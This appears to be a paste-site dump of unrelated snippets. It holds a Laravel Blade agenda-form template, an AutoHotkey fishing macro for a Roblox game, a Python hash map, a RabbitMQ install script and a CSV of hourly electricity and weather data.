                                $data->status == 'NEED APPROVE')
                            <a href=""{{ route('admin.agenda.change.status', ['id' => $data->agenda_id, 'need_status' => 'APPROVED']) }}""
                                class=""btn btn-success"" type=""button"" id=""approve"">Approve Agenda</a>
                        @else
                            <button class=""btn btn-primary"" type=""submit"" id=""submitForm"">Submit</button>
                        @endif
                        <a href=""{{ route('admin.agenda.index') }}"" class=""btn btn-danger"" type=""button""
                            id=""cancel"">Cancel</a>
                    </div>
                </div>
            </form>
        </div>
    </section>
@endsection


@push('scripts')
    <!-- Include jQuery -->
    <!-- Include jQuery UI CSS and JavaScript -->
    <link rel=""stylesheet"" href=""https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css"">
    <script src=""https://code.jquery.com/ui/1.12.1/jquery-ui.js""></script>
    <script>
        $(function() {
            $('#week_data').datepicker({
                showWeek: true,
                firstDay: 1,
                onSelect: function(dateText, inst) {
                    var date = $(this).datepicker('getDate');
                    var year = date.getFullYear();
                    var week = $.datepicker.iso8601Week(date);

                    var weekString = week.toString();
                    if (weekString.length === 1) {
                        weekString = '0' + weekString;
                    }

                    $(this).val(year + '-W' + weekString);
                    updateLabels();
                }
            });
        });
    </script>

    <script>
        function updateLabels() {
            var weekInput = document.getElementById('week_data');

            var selectedWeek = weekInput.value;
            var parts = selectedWeek.split('-W');
            var year = parts[0];
            var weekNumber = parts[1];

            var startDate = new Date(year, 0, 1 + (weekNumber - 1) * 7);

            for (var i = 1; i <= 7; i++) {
                var dayElement = document.getElementById('label' + (i));
                var labelDate = new Date(startDate);
                labelDate.setDate(startDate.getDate() + i);
                var day = labelDate.getDate() - 1;
                var month = labelDate.getMonth() + 1;
                var year = labelDate.getFullYear();
                dayElement.textContent = day + '-' + month + '-' + year;
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            let rowCounter = 0;
            for (let index = 1; index <= 7; index++) {
                rowCounter = 0;
                document.getElementById('addMore' + index).addEventListener('click', function() {
                    var container = document.getElementById('addMoreContainer' + index);

                    var row = document.createElement('tr');

                    row.innerHTML = `
                        <td>
                            <input type=""time"" class=""form-control"" name=""startTime${index}[]"" required>
                        </td>
                        <td>
                            <input type=""time"" class=""form-control"" name=""endTime${index}[]"" required>
                        </td>
                        <td>
                            <input type=""text"" class=""form-control"" name=""agenda${index}[]"" required>
                        </td>
                        <td>
                            <select style=""width: 200px;"" multiple class=""form-control select2"" name=""bod${index}[${rowCounter}][]"" required>
                                <option value=""""> - Select BOD - </option>
                                @foreach ($employees as $employee)
                                    <option value=""personal_{{ $employee->nik }}"">{{ $employee->name . ' - ' . $employee->title_name }}</option>
                                @endforeach
                                @foreach ($userGroup as $ug)
                                    <option value=""group_{{ $ug->id }}"">{{ 'GROUP - ' . $ug->group_name }}</option>
                                @endforeach
                            </select>
                        </td>
                        <td>
                            <select style=""width: 200px;"" multiple class=""form-control select2"" name=""participant${index}[${rowCounter}][]"">
                                <option value=""""> - Select Participant - </option>
                                @foreach ($employees as $employee)
                                    <option value=""personal_{{ $employee->nik }}"">{{ $employee->name . ' - ' . $employee->title_name }}</option>
                                @endforeach
                                @foreach ($userGroup as $ug)
                                    <option value=""group_{{ $ug->id }}"">{{ 'GROUP - ' . $ug->group_name }}</option>
                                @endforeach
                            </select>
                        </td>
                        <td>
                            <select style=""width: 200px;"" class=""form-control select2"" name=""tempat${index}[]"" required>
                                <option value=""""> - Select Location - </option>
                                @foreach ($locations as $l)
                                    <option value=""{{ $l->id }}"">
                                        {{ $l->name }}
                                    </option>
                                @endforeach
                            </select>
                        </td>
                        <td>
                            <button type=""button"" class=""btn btn-danger removeField${index}"">Remove</button>
                        </td>
                    `;

                    container.appendChild(row);
                    $(row).find('.select2').select2();

                    // Add event listener for remove button
                    var removeButton = row.querySelector('.removeField' + index);
                    removeButton.addEventListener('click', function() {
                        row.remove();
                    });

                    rowCounter++;
                });
            }

            @for ($i = 1; $i <= 7; $i++)
                rowCounter = 0;
                @if ($data && $data->agendaDetails)
                    var container = document.getElementById('addMoreContainer' + {{ $i }});
                    @foreach ($data->agendaDetails as $detail)
                        @if ($detail->day == $i)
                            var row = document.createElement('tr');
                            row.innerHTML = `  
                                <td>
                                    <input type=""time"" class=""form-control"" name=""startTime{{ $i }}[]"" value=""{{ $detail ? $detail->start_time : '' }}"" required>
                                </td>
                                <td>
                                    <input type=""time"" class=""form-control"" name=""endTime{{ $i }}[]"" value=""{{ $detail ? $detail->end_time : '' }}"" required>
                                </td>
                                <td>
                                    <input type=""text"" class=""form-control"" name=""agenda{{ $i }}[]"" value=""{{ $detail->agenda }}"" required>
                                </td>
                                <td>
                                    <select style=""width: 200px;"" multiple class=""form-control select2"" name=""bod{{ $i }}[${rowCounter}][]"" required>
                                        <option value=""""> - Select BOD - </option>
                                        @php
                                            $selectedBods = $detail->agendaDetailBods->pluck('type', 'identity')->all();
                                        @endphp
                                        @foreach ($employees as $employee)
                                            @if ($selectedBods)
                                                @foreach ($selectedBods as $identity => $type)
                                                    <option value=""personal_{{ $employee->nik }}"" {{ 'personal_' . $employee->nik == $type . '_' . $identity ? 'selected' : '' }}>
                                                        {{ $employee->name . ' - ' . $employee->title_name }}
                                                    </option>
                                                @endforeach
                                            @else
                                                <option value=""personal_{{ $employee->nik }}"">
                                                    {{ $employee->name . ' - ' . $employee->title_name }}
                                                </option>
                                            @endif            
                                        @endforeach
                                        @foreach ($userGroup as $ug)
                                            @if ($selectedBods)
                                                @foreach ($selectedBods as $identity => $type)
                                                    <option value=""group_{{ $ug->id }}"" {{ 'group_' . $ug->id == $type . '_' . $identity ? 'selected' : '' }}>
                                                        {{ 'GROUP - ' . $ug->group_name }}
                                                    </option>
                                                @endforeach
                                            @else
                                                <option value=""group_{{ $ug->id }}"">
                                                    {{ 'GROUP - ' . $ug->group_name }}
                                                </option>
                                            @endif
                                        @endforeach
                                    </select>
                                </td>
                                <td>
                                    <select style=""width: 200px;"" multiple class=""form-control select2"" name=""participant{{ $i }}[${rowCounter}][]"">
                                        <option value=""""> - Select Participant - </option>
                                        @php
                                            $selectedParticipants = $detail->agendaDetailParticipants->pluck('type', 'identity')->all();
                                        @endphp
                                        @foreach ($employees as $employee)
                                            @if ($selectedParticipants)
                                                @foreach ($selectedParticipants as $identity => $type)
                                                    <option value=""personal_{{ $employee->nik }}"" {{ 'personal_' . $employee->nik == $type . '_' . $identity ? 'selected' : '' }}>
                                                        {{ $employee->name . ' - ' . $employee->title_name }}
                                                    </option>
                                                @endforeach
                                            @else
                                                <option value=""personal_{{ $employee->nik }}"">
                                                    {{ $employee->name . ' - ' . $employee->title_name }}
                                                </option>
                                            @endif
                                        @endforeach
                                        @foreach ($userGroup as $ug)
                                            @if ($selectedParticipants)
                                                @foreach ($selectedParticipants as $identity => $type)
                                                    <option value=""group_{{ $ug->id }}"" {{ 'group_' . $ug->id == $type . '_' . $identity ? 'selected' : '' }}>
                                                        {{ 'GROUP - ' . $ug->group_name }}
                                                    </option>
                                                @endforeach
                                            @else
                                                <option value=""group_{{ $ug->id }}"">
                                                    {{ 'GROUP - ' . $ug->group_name }}
                                                </option>
                                            @endif
                                        @endforeach
                                    </select>
                                </td>
                                <td> 
                                    <select style=""width: 200px;"" class=""form-control select2"" name=""tempat{{ $i }}[]"" required>
                                        <option value=""""> - Select Location - </option>
                                        @foreach ($locations as $l)
                                            <option value=""{{ $l->id }}"" {{ $l->id == $detail->tempat ? 'selected' : '' }}>
                                                {{ $l->name }}
                                            </option>
                                        @endforeach
                                    </select>
                                </td>
                                <td>
                                    <button type=""button"" class=""btn btn-danger removeField{{ $i }}"">Remove</button>
                                </td>
                            `;

                            container.appendChild(row);
                            $(row).find('.select2').select2();

                            // Add event listener for remove button
                            var removeButton = row.querySelector('.removeField' + {{ $i }});
                            removeButton.addEventListener('click', function() {
                                this.closest('tr').remove();
                                // row.remove();
                                // console.log(row);
                            });

                            rowCounter++;
                        @endif
                    @endforeach
                @endif
            @endfor


            if (document.getElementById('week_data').value != null) {
                updateLabels();
            }
        });
    </script>
@endpush

?>"
F2XUm59n,Pet Simulator 99 Auto Fish v2,Killyoboy,Autohotkey,Tuesday 2nd of January 2024 09:52:12 PM CDT,"#MaxThreadsPerHotKey, 2
Toggle := 0

F1::
Toggle := !Toggle

While Toggle {
    PixelSearch, redX, redY, 1485, 255, 1511, 862, 0x5B0000, 5, fast RGB ;;red
    PixelSearch, greyX, greyY, 1485, 255, 1511, 862, 0xE3CBC7, 1, fast ;;grey
    PixelSearch, greenX, greenY, 1485, 255, 1511, 862, 0x12F88B, 5, fast ;;green
    
    if(redX or greenX or greyX) {
        if(greyX) {
            if(greyY > redY) {
                Send {Click down}
            } else {
                Send {Click up}
            }
        } else {
            green := True
            
            Loop {
                Send {Click down}
                Sleep, 125
                Send {Click up}
                Sleep, 50
                PixelSearch, greenX, greenY, 1485, 255, 1511, 862, 0x12F88B, 5, fast ;;green
                
                if(not greenY) {
                    green := False
                }
            } Until (not green)
        }
    } else {
        Send {Click down}
        Sleep, 100
        Send {Click up}
        Sleep, 3000
        Send {Click down}
    }
}"
4k7jFk9Y,hasmap,nirajs,Python,Tuesday 2nd of January 2024 09:38:43 PM CDT,"class Bucket:
    def __init__(self):
        self.bucket = []

    def get(self, key):
        for (k,v) in self.bucket:
            if k == key:
                return v
        return -1

    def put(self, key, val):
        found = False
        for i, (k,v) in enumerate(self.bucket):
            if (k == key):
                self.bucket[i] = (key, val)
                found = True
        if (not found):
            self.bucket.append((key, val))
            print(self.bucket)

    def remove(self, key):
        for i, (k,v) in enumerate(self.bucket):
            if (k == key):
                del self.bucket[i]

class MyHashMap:
    def __init__(self):
        self.hashTable = [Bucket() for _ in range(1027)]

    def get(self, key):
        index = hash(key) % len(self.hashTable)
        return self.hashTable[index].get(key)

    def put(self, key, val):
        index = hash(key) % len(self.hashTable)
        self.hashTable[index].put(key, val)

    def remove(self, key):
        index = hash(key) % len(self.hashTable)
        self.hashTable[index].remove(key)


# map = MyHashMap()
# map.put(1,2)
# print(map.get(1))
# map.remove(1)"
8gJTDUYu,rabbitmq-install-with-pinning-enable-plugins,u1-liquid,Bash,Tuesday 2nd of January 2024 09:37:18 PM CDT,"#!/bin/sh

# maybe we should change eol of this file ( by :set ff=unix )
# from https://www.rabbitmq.com/install-debian.html#apt-quick-start-cloudsmith

sudo apt-get install curl gnupg apt-transport-https -y

## Team RabbitMQ's main signing key
curl -1sLf ""https://keys.openpgp.org/vks/v1/by-fingerprint/0A9AF2115F4687BD29803A206B73A36E6026DFCA"" | sudo gpg --dearmor | sudo tee /usr/share/keyrings/com.rabbitmq.team.gpg > /dev/null
## Community mirror of Cloudsmith: modern Erlang repository
curl -1sLf https://github.com/rabbitmq/signing-keys/releases/download/3.0/cloudsmith.rabbitmq-erlang.E495BB49CC4BBE5B.key | sudo gpg --dearmor | sudo tee /usr/share/keyrings/rabbitmq.E495BB49CC4BBE5B.gpg > /dev/null
## Community mirror of Cloudsmith: RabbitMQ repository
curl -1sLf https://github.com/rabbitmq/signing-keys/releases/download/3.0/cloudsmith.rabbitmq-server.9F4587F226208342.key | sudo gpg --dearmor | sudo tee /usr/share/keyrings/rabbitmq.9F4587F226208342.gpg > /dev/null

## Add apt repositories maintained by Team RabbitMQ
sudo tee /etc/apt/sources.list.d/rabbitmq.list <<EOF
## Provides modern Erlang/OTP releases
##
deb [signed-by=/usr/share/keyrings/rabbitmq.E495BB49CC4BBE5B.gpg] https://ppa1.novemberain.com/rabbitmq/rabbitmq-erlang/deb/ubuntu jammy main
deb-src [signed-by=/usr/share/keyrings/rabbitmq.E495BB49CC4BBE5B.gpg] https://ppa1.novemberain.com/rabbitmq/rabbitmq-erlang/deb/ubuntu jammy main

# another mirror for redundancy
deb [signed-by=/usr/share/keyrings/rabbitmq.E495BB49CC4BBE5B.gpg] https://ppa2.novemberain.com/rabbitmq/rabbitmq-erlang/deb/ubuntu jammy main
deb-src [signed-by=/usr/share/keyrings/rabbitmq.E495BB49CC4BBE5B.gpg] https://ppa2.novemberain.com/rabbitmq/rabbitmq-erlang/deb/ubuntu jammy main

## Provides RabbitMQ
##
deb [signed-by=/usr/share/keyrings/rabbitmq.9F4587F226208342.gpg] https://ppa1.novemberain.com/rabbitmq/rabbitmq-server/deb/ubuntu jammy main
deb-src [signed-by=/usr/share/keyrings/rabbitmq.9F4587F226208342.gpg] https://ppa1.novemberain.com/rabbitmq/rabbitmq-server/deb/ubuntu jammy main

# another mirror for redundancy
deb [signed-by=/usr/share/keyrings/rabbitmq.9F4587F226208342.gpg] https://ppa2.novemberain.com/rabbitmq/rabbitmq-server/deb/ubuntu jammy main
deb-src [signed-by=/usr/share/keyrings/rabbitmq.9F4587F226208342.gpg] https://ppa2.novemberain.com/rabbitmq/rabbitmq-server/deb/ubuntu jammy main
EOF

## Configure apt to install erlang-* packages from the Cloudsmith mirror
sudo tee /etc/apt/preferences.d/erlang <<EOF
Package: erlang*
Pin: origin ppa1.novemberain.com
# Note: priority of 1001 (greater than 1000) allows for downgrading.
# To make package downgrading impossible, use a value of 999
Pin-Priority: 1001
EOF

## Update package indices
sudo apt-get update -y

## Install Erlang packages
sudo apt-get install -y erlang-base \
                        erlang-asn1 erlang-crypto erlang-eldap erlang-ftp erlang-inets \
                        erlang-mnesia erlang-os-mon erlang-parsetools erlang-public-key \
                        erlang-runtime-tools erlang-snmp erlang-ssl \
                        erlang-syntax-tools erlang-tftp erlang-tools erlang-xmerl

## Install rabbitmq-server and its dependencies
sudo apt-get install rabbitmq-server -y --fix-missing

## enable plugins
sudo rabbitmq-plugins enable rabbitmq_amqp1_0 rabbitmq_management rabbitmq_top"
X6hN8znV,matlab-SOM-DATA,davidcastrosalinas,HTML,Tuesday 2nd of January 2024 09:21:50 PM CDT,"DateTime,Consumption,Production,Nuclear,Wind,Hydroelectric,OilAndGas,Coal,Solar,Biomass,Indice,FechaHora,Hora,day,dayofweek,T_high,T_avg,T_low,HDD,H_high,H_avg,W_high,Precip
2023-02-01 00:00:00,5990,7776,1407,1126,2362,1801,1015,0,65,1,2023-02-01 00:00:00,0,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 01:00:00,5815,6718,1403,1100,1603,1554,995,0,65,2,2023-02-01 01:00:00,1,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 02:00:00,5703,6670,1403,995,1621,1572,1012,0,66,3,2023-02-01 02:00:00,2,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 03:00:00,5649,6532,1404,924,1608,1526,1001,0,67,4,2023-02-01 03:00:00,3,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 04:00:00,5740,6359,1401,733,1599,1547,1012,0,66,5,2023-02-01 04:00:00,4,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 05:00:00,5936,6349,1404,471,1729,1636,1043,0,65,6,2023-02-01 05:00:00,5,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 06:00:00,6475,6718,1403,522,2078,1618,1031,0,66,7,2023-02-01 06:00:00,6,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 07:00:00,7197,7371,1404,680,2522,1608,1088,0,67,8,2023-02-01 07:00:00,7,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 08:00:00,7749,7534,1403,714,2538,1637,1112,60,69,9,2023-02-01 08:00:00,8,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 09:00:00,8001,7648,1343,822,2459,1615,1112,228,68,10,2023-02-01 09:00:00,9,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 10:00:00,7835,7658,1342,928,2355,1544,1053,363,71,11,2023-02-01 10:00:00,10,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 11:00:00,7687,7878,1381,1133,2266,1566,1018,442,70,12,2023-02-01 11:00:00,11,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 12:00:00,7586,8012,1386,1264,2239,1604,1031,417,69,13,2023-02-01 12:00:00,12,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 13:00:00,7655,8005,1395,1269,2246,1622,1039,365,68,14,2023-02-01 13:00:00,13,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 14:00:00,7452,7846,1405,1222,2097,1631,1045,378,68,15,2023-02-01 14:00:00,14,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 15:00:00,7346,7688,1401,1048,2193,1652,1059,266,69,16,2023-02-01 15:00:00,15,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 16:00:00,7416,7843,1400,1217,2415,1599,1035,104,71,17,2023-02-01 16:00:00,16,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 17:00:00,7648,7849,1399,1236,2500,1601,1036,4,72,18,2023-02-01 17:00:00,17,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 18:00:00,7962,8118,1402,875,2880,1770,1118,0,72,19,2023-02-01 18:00:00,18,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 19:00:00,7858,7979,1403,630,2981,1773,1119,0,71,20,2023-02-01 19:00:00,19,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 20:00:00,7755,7841,1405,386,3083,1777,1120,0,70,21,2023-02-01 20:00:00,20,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 21:00:00,7301,7624,1404,264,3029,1747,1112,0,68,22,2023-02-01 21:00:00,21,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 22:00:00,6694,7333,1405,249,2931,1712,970,0,65,23,2023-02-01 22:00:00,22,1,4,68,58,48,7,97,85,8,0.01
2023-02-01 23:00:00,6280,7004,1406,312,2508,1735,978,0,66,24,2023-02-01 23:00:00,23,1,4,68,58,48,7,97,85,8,0.01
2023-02-02 00:00:00,6105,6720,1401,356,2179,1732,987,0,64,25,2023-02-02 00:00:00,0,2,5,69,55,41,10,98,86,8,0
2023-02-02 01:00:00,5795,6369,1403,417,1772,1711,1003,0,62,26,2023-02-02 01:00:00,1,2,5,69,55,41,10,98,86,8,0
2023-02-02 02:00:00,5674,6535,1408,582,1741,1726,1014,0,63,27,2023-02-02 02:00:00,2,2,5,69,55,41,10,98,86,8,0
2023-02-02 03:00:00,5675,6479,1403,711,1619,1678,1004,0,63,28,2023-02-02 03:00:00,3,2,5,69,55,41,10,98,86,8,0
2023-02-02 04:00:00,5742,6531,1405,763,1628,1666,1006,0,62,29,2023-02-02 04:00:00,4,2,5,69,55,41,10,98,86,8,0
2023-02-02 05:00:00,5959,6408,1405,570,1671,1701,997,0,65,30,2023-02-02 05:00:00,5,2,5,69,55,41,10,98,86,8,0
2023-02-02 06:00:00,6355,6832,1406,865,1868,1681,947,0,64,31,2023-02-02 06:00:00,6,2,5,69,55,41,10,98,86,8,0
2023-02-02 07:00:00,7119,7348,1408,966,2230,1707,971,0,65,32,2023-02-02 07:00:00,7,2,5,69,55,41,10,98,86,8,0
2023-02-02 08:00:00,7621,7363,1394,755,2370,1716,1007,57,66,33,2023-02-02 08:00:00,8,2,5,69,55,41,10,98,86,8,0
2023-02-02 09:00:00,7706,7222,1361,683,2227,1701,990,193,66,34,2023-02-02 09:00:00,9,2,5,69,55,41,10,98,86,8,0
2023-02-02 10:00:00,7691,7185,1375,511,2259,1683,1003,285,66,35,2023-02-02 10:00:00,10,2,5,69,55,41,10,98,86,8,0
2023-02-02 11:00:00,7544,7171,1365,528,2251,1670,1005,286,65,36,2023-02-02 11:00:00,11,2,5,69,55,41,10,98,86,8,0
2023-02-02 12:00:00,7567,7183,1346,545,2292,1680,1002,252,64,37,2023-02-02 12:00:00,12,2,5,69,55,41,10,98,86,8,0
2023-02-02 13:00:00,7631,7329,1358,883,2143,1647,984,246,65,38,2023-02-02 13:00:00,13,2,5,69,55,41,10,98,86,8,0
2023-02-02 14:00:00,7427,7225,1332,969,2016,1684,948,209,65,39,2023-02-02 14:00:00,14,2,5,69,55,41,10,98,86,8,0
2023-02-02 15:00:00,7313,7228,1355,929,2023,1677,977,197,67,40,2023-02-02 15:00:00,15,2,5,69,55,41,10,98,86,8,0
2023-02-02 16:00:00,7276,7554,1352,1103,2221,1697,1004,99,68,41,2023-02-02 16:00:00,16,2,5,69,55,41,10,98,86,8,0
2023-02-02 17:00:00,7531,7291,1364,1004,2198,1659,989,9,68,42,2023-02-02 17:00:00,17,2,5,69,55,41,10,98,86,8,0
2023-02-02 18:00:00,7777,7430,1370,682,2657,1643,1009,0,68,43,2023-02-02 18:00:00,18,2,5,69,55,41,10,98,86,8,0
2023-02-02 19:00:00,7784,7604,1381,858,2653,1640,1002,0,69,44,2023-02-02 19:00:00,19,2,5,69,55,41,10,98,86,8,0
2023-02-02 20:00:00,7663,7612,1380,965,2592,1616,990,0,67,45,2023-02-02 20:00:00,20,2,5,69,55,41,10,98,86,8,0
2023-02-02 21:00:00,7263,7562,1380,1194,2379,1574,967,0,67,46,2023-02-02 21:00:00,21,2,5,69,55,41,10,98,86,8,0
2023-02-02 22:00:00,6804,7521,1380,1167,2365,1589,952,0,67,47,2023-02-02 22:00:00,22,2,5,69,55,41,10,98,86,8,0
2023-02-02 23:00:00,6318,7047,1385,1138,1841,1656,946,0,66,48,2023-02-02 23:00:00,23,2,5,69,55,41,10,98,86,8,0
2023-02-03 00:00:00,6015,6691,1385,966,1735,1578,960,0,65,49,2023-02-03 00:00:00,0,3,6,74,62,49,4,98,86,15,0
2023-02-03 01:00:00,5830,6951,1390,1147,1722,1639,986,0,66,50,2023-02-03 01:00:00,1,3,6,74,62,49,4,98,86,15,0
2023-02-03 02:00:00,5723,6881,1395,1097,1701,1647,974,0,65,51,2023-02-03 02:00:00,2,3,6,74,62,49,4,98,86,15,0
2023-02-03 03:00:00,5646,6842,1397,1069,1718,1618,973,0,65,52,2023-02-03 03:00:00,3,3,6,74,62,49,4,98,86,15,0
2023-02-03 04:00:00,5814,6885,1397,970,1783,1673,995,0,66,53,2023-02-03 04:00:00,4,3,6,74,62,49,4,98,86,15,0
2023-02-03 05:00:00,5943,6891,1396,1040,1768,1650,972,0,65,54,2023-02-03 05:00:00,5,3,6,74,62,49,4,98,86,15,0
2023-02-03 06:00:00,6298,7054,1397,1178,1877,1589,948,0,64,55,2023-02-03 06:00:00,6,3,6,74,62,49,4,98,86,15,0
2023-02-03 07:00:00,7246,7454,1397,1177,2218,1620,974,0,65,56,2023-02-03 07:00:00,7,3,6,74,62,49,4,98,86,15,0
2023-02-03 08:00:00,7854,7557,1396,1197,2228,1616,992,62,66,57,2023-02-03 08:00:00,8,3,6,74,62,49,4,98,86,15,0
2023-02-03 09:00:00,8005,7556,1348,1087,2209,1620,987,239,66,58,2023-02-03 09:00:00,9,3,6,74,62,49,4,98,86,15,0
2023-02-03 10:00:00,7886,7394,1314,906,2185,1607,979,336,65,59,2023-02-03 10:00:00,10,3,6,74,62,49,4,98,86,15,0
2023-02-03 11:00:00,7699,7371,1363,800,2173,1558,972,439,64,60,2023-02-03 11:00:00,11,3,6,74,62,49,4,98,86,15,0
2023-02-03 12:00:00,7569,7364,1365,620,2234,1584,983,512,65,61,2023-02-03 12:00:00,12,3,6,74,62,49,4,98,86,15,0
2023-02-03 13:00:00,7530,7175,1382,570,2074,1592,981,507,66,62,2023-02-03 13:00:00,13,3,6,74,62,49,4,98,86,15,0
2023-02-03 14:00:00,7360,6958,1379,447,2100,1634,981,350,64,63,2023-02-03 14:00:00,14,3,6,74,62,49,4,98,86,15,0
2023-02-03 15:00:00,7302,6788,1379,314,2131,1645,1027,225,66,64,2023-02-03 15:00:00,15,3,6,74,62,49,4,98,86,15,0
2023-02-03 16:00:00,7421,6733,1386,215,2279,1694,1011,80,67,65,2023-02-03 16:00:00,16,3,6,74,62,49,4,98,86,15,0
2023-02-03 17:00:00,7711,6645,1385,134,2328,1707,1020,2,68,66,2023-02-03 17:00:00,17,3,6,74,62,49,4,98,86,15,0
2023-02-03 18:00:00,8021,6904,1395,94,2618,1706,1023,0,67,67,2023-02-03 18:00:00,18,3,6,74,62,49,4,98,86,15,0
2023-02-03 19:00:00,7890,6882,1391,145,2586,1676,1016,0,68,68,2023-02-03 19:00:00,19,3,6,74,62,49,4,98,86,15,0
2023-02-03 20:00:00,7614,6949,1396,236,2557,1682,1009,0,67,69,2023-02-03 20:00:00,20,3,6,74,62,49,4,98,86,15,0
2023-02-03 21:00:00,7202,6877,1398,400,2397,1616,997,0,67,70,2023-02-03 21:00:00,21,3,6,74,62,49,4,98,86,15,0
2023-02-03 22:00:00,6634,6916,1399,539,2327,1614,968,0,69,71,2023-02-03 22:00:00,22,3,6,74,62,49,4,98,86,15,0
2023-02-03 23:00:00,6310,6745,1400,513,2053,1712,1000,0,67,72,2023-02-03 23:00:00,23,3,6,74,62,49,4,98,86,15,0
2023-02-04 00:00:00,5959,6598,1400,701,1803,1617,1013,0,62,73,2023-02-04 00:00:00,0,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 01:00:00,5860,6738,1399,886,1639,1723,1026,0,65,74,2023-02-04 01:00:00,1,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 02:00:00,5743,6808,1403,925,1643,1731,1040,0,66,75,2023-02-04 02:00:00,2,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 03:00:00,5613,6664,1403,796,1632,1730,1036,0,67,76,2023-02-04 03:00:00,3,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 04:00:00,5692,6501,1401,648,1635,1719,1029,0,67,77,2023-02-04 04:00:00,4,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 05:00:00,5701,6482,1402,660,1639,1703,1008,0,68,78,2023-02-04 05:00:00,5,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 06:00:00,5958,6505,1404,648,1733,1660,994,0,67,79,2023-02-04 06:00:00,6,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 07:00:00,6317,6818,1403,488,2186,1623,1051,0,67,80,2023-02-04 07:00:00,7,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 08:00:00,6695,6912,1403,302,2414,1625,1084,15,68,81,2023-02-04 08:00:00,8,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 09:00:00,7071,6804,1350,117,2421,1670,1074,103,67,82,2023-02-04 09:00:00,9,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 10:00:00,7157,6791,1375,42,2404,1669,1047,184,67,83,2023-02-04 10:00:00,10,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 11:00:00,7122,6737,1378,43,2286,1650,1065,245,68,84,2023-02-04 11:00:00,11,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 12:00:00,7042,6645,1391,71,2208,1654,987,264,69,85,2023-02-04 12:00:00,12,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 13:00:00,7017,6599,1379,179,2147,1659,941,223,68,86,2023-02-04 13:00:00,13,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 14:00:00,6820,6602,1348,340,2143,1660,883,158,68,87,2023-02-04 14:00:00,14,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 15:00:00,6827,6775,1386,478,2129,1658,957,98,69,88,2023-02-04 15:00:00,15,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 16:00:00,6917,6969,1391,634,2182,1645,997,51,70,89,2023-02-04 16:00:00,16,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 17:00:00,7074,7124,1390,867,2172,1618,997,7,70,90,2023-02-04 17:00:00,17,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 18:00:00,7423,7542,1391,1365,2211,1584,920,0,70,91,2023-02-04 18:00:00,18,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 19:00:00,7388,7873,1394,1684,2195,1618,911,0,70,92,2023-02-04 19:00:00,19,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 20:00:00,7295,8062,1392,2002,2049,1630,917,0,71,93,2023-02-04 20:00:00,20,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 21:00:00,6932,8368,1393,2465,1926,1604,908,0,71,94,2023-02-04 21:00:00,21,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 22:00:00,6513,8681,1391,2656,1968,1663,933,0,70,95,2023-02-04 22:00:00,22,4,7,77,71,64,6,94,89,22,0.18
2023-02-04 23:00:00,6165,8572,1395,2702,1687,1766,952,0,68,96,2023-02-04 23:00:00,23,4,7,77,71,64,6,94,89,22,0.18
2023-02-05 00:00:00,5886,8429,1398,2718,1615,1705,925,0,67,97,2023-02-05 00:00:00,0,5,1,67,61,55,4,96,82,11,0
2023-02-05 01:00:00,5627,8523,1397,2725,1829,1586,921,0,64,98,2023-02-05 01:00:00,1,5,1,67,61,55,4,96,82,11,0
2023-02-05 02:00:00,5496,8557,1399,2718,1814,1573,990,0,63,99,2023-02-05 02:00:00,2,5,1,67,61,55,4,96,82,11,0
2023-02-05 03:00:00,5439,8400,1398,2724,1680,1555,980,0,63,100,2023-02-05 03:00:00,3,5,1,67,61,55,4,96,82,11,0
2023-02-05 04:00:00,5522,8282,1399,2720,1543,1573,983,0,63,101,2023-02-05 04:00:00,4,5,1,67,61,55,4,96,82,11,0
2023-02-05 05:00:00,5499,8189,1399,2707,1522,1543,961,0,62,102,2023-02-05 05:00:00,5,5,1,67,61,55,4,96,82,11,0
2023-02-05 06:00:00,5632,8381,1397,2709,1722,1551,938,0,64,103,2023-02-05 06:00:00,6,5,1,67,61,55,4,96,82,11,0
2023-02-05 07:00:00,5810,8732,1398,2708,2066,1536,954,0,67,104,2023-02-05 07:00:00,7,5,1,67,61,55,4,96,82,11,0
2023-02-05 08:00:00,6103,8914,1399,2698,2228,1534,964,25,64,105,2023-02-05 08:00:00,8,5,1,67,61,55,4,96,82,11,0
2023-02-05 09:00:00,6249,9260,1399,2705,2393,1581,968,146,66,106,2023-02-05 09:00:00,9,5,1,67,61,55,4,96,82,11,0
